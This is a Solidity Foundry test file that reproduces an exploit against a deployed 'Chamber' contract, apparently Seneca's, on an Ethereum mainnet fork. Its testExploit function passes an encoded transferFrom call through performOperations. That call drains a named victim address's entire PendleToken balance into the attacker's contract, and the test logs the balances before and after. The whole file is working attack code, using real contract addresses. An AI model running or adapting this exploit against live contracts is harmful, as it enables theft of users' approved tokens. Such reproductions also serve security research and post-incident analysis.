// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";

import "./IChamber.sol";

IChamber constant Chamber = IChamber(
    0x65c210c59B43EB68112b7a4f75C8393C36491F06
);
IERC20 constant PendleToken = IERC20(
    0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E
);
address constant victim = 0x9CBF099ff424979439dFBa03F00B5961784c06ce;

contract SenecaTest is Test {
    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function setUp() public {
        vm.createSelectFork("mainnet", 19325936);
        vm.label(address(Chamber), "Chamber");
        vm.label(address(PendleToken), "PendleToken");
        vm.label(victim, "victim");
    }

    function testExploit() public {
        // Datas
        uint256 amount = PendleToken.balanceOf(victim);
        bytes memory callData = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            victim,
            address(this),
            amount
        );
        bytes memory data = abi.encode(
            address(PendleToken),
            callData,
            false,
            false,
            uint256(0)
        );
        bytes[] memory datas = new bytes[](1);
        datas[0] = data;

        // Actions
        uint8[] memory actions = new uint8[](1);
        actions[0] = 30;

        // Values
        uint256[] memory values = new uint256[](1);
        values[0] = uint256(0);

        print(
            "PendleToken balance before",
            PendleToken.balanceOf(address(this)),
            18
        );

        Chamber.performOperations(actions, values, datas);

        print(
            "PendleToken balance after",
            PendleToken.balanceOf(address(this)),
            18
        );
    }
}
